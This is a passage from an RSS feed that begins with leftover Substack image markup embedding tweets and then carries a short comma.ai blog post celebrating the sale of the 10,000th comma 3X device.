https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png" width="672" height="92.9090909090909" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:73,&quot;width&quot;:528,&quot;resizeWidth&quot;:672,&quot;bytes&quot;:22072,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://x.com/RampCapitalLLC/status/1777393030011535819&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70d58e48-308c-4f3b-a60c-fd0f6170cb60_528x73.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://x.com/RobertMSterling/status/1777328550649221221" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png" width="679" height="522.3076923076923" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:450,&quot;width&quot;:585,&quot;resizeWidth&quot;:679,&quot;bytes&quot;:315966,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://x.com/RobertMSterling/status/1777328550649221221&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fffe12bd8-a609-41f1-ac1c-f9a3483514aa_585x450.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://twitter.com/spectatorindex/status/1777447863615922270" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png" width="966" height="632" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:632,&quot;width&quot;:966,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:228473,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:&quot;https://twitter.com/spectatorindex/status/1777447863615922270&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe06881c3-88c6-4d08-8236-b23bebca33ae_966x632.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div></div></article></div><div id="discussion"><h4>Discussion about this post</h4></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Happy 10k Day (140 pts)]]></title>
            <link>https://blog.comma.ai/happy10kday/</link>
            <guid>43339158</guid>
            <pubDate>Wed, 12 Mar 2025 01:46:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.comma.ai/happy10kday/">https://blog.comma.ai/happy10kday/</a>, See on <a href="https://news.ycombinator.com/item?id=43339158">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<header>
<p> <span>  <time datetime="2025-03-11T18:00:00+00:00">March 11, 2025</time> </span> <span></span> <span>  less than 1 minute read </span></p></header><section itemprop="text"><p>Today, we sold the 10,000th comma 3X, our first product breaking 5 digits in sales.</p>
<hr>
<blockquote><p>We do these things not because they are easy, but because we thought they were going to be easy</p></blockquote>
<figure><picture> <source srcset="https://blog.comma.ai/img/10kday/stripe.webp" type="image/webp"> <img src="https://blog.comma.ai/img/10kday/stripe.png" alt=""> </picture><figcaption></figcaption></figure><p>Hardware is hard. Making a product that offers more value than it costs is hard.</p>
<p>We <a href="https://techcrunch.com/2017/07/07/comma-ai-launches-an-88-universal-car-interface-called-panda/" target="_blank" rel="noopener noreferrer">launched</a> our first product, the panda, in 2017. Initial sales were great, then quickly trailed off.</p>
<p>Fast forward to 2025, and we have a <a href="https://comma.ai/shop" target="_blank" rel="noopener noreferrer">real product</a> that users love, built in our own factory, with great unit economics, and a real supply chain. (Check out the <a href="https://www.youtube.com/watch?v=PFjssb7r_uU" target="_blank" rel="noopener noreferrer">factory tour</a> if you haven’t seen it.)</p>
<hr>
<p>As I write this, we’re finalizing construction plans to max out our office’s datacenter and manufacturing capacity next month.</p>
<p>I’m optimistic 2025 will be comma’s biggest year yet. We’ve had the second largest fleet after Tesla for a while now, and with a <a href="https://blog.comma.ai/autonomy/#world-model-as-a-simulator">training architecture able to take advantage of it</a>, we’re leveraging that fleet to massively scale up data ingestion, processing, and training compute.</p>
<p><br> <em>Adeeb Shihadeh</em> <br> <em>Chief Product Officer @ comma.ai</em></p>
<hr>
<p><em>PS: autonomy, product, and operations are all <a href="https://comma.ai/jobs" target="_blank" rel="noopener noreferrer">hiring</a>, including interns.</em></p></section>
</div></div>]]></description>
        </item>
    </channel>
</rss>